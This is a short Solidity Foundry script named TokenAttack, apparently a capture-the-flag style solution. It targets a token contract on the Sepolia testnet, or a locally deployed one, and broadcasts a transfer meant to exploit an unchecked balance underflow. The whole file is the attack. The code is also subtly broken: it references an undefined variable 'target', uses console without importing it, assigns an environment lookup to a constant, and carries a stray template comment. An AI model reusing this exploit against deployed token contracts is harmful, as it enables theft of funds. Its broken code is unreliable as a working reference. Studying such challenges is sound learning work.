// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Token} from "src/Token.sol";

contract TokenAttack is Script {
    error TokenAttack__Failed_Attempt();
    Token token;
    address constant attacker = vm.envAddress("ATTACKER");
    uint constant INITIAL_SUPPLY = 21e6;

    function run() external returns (Token) {
        if (block.chainid == 11155111) {
            token = Token(vm.envAddress("TOKEN_TARGET"));
            console.log("My Balance: ", token.balanceOf(attacker));
        } else if (block.chainid == 31337 && address(target) == address(0)) {
            token = new Token(INITIAL_SUPPLY);
        }

        vm.startBroadcast(); //////////////////////////////////////////// @title A title that should describe the contract/interface
        bool success = token.transfer(address(this), 21);
        if (!success) revert TokenAttack__Failed_Attempt();
        vm.stopBroadcast(); /////////////////////////////////////////////

        return token;
    }
}
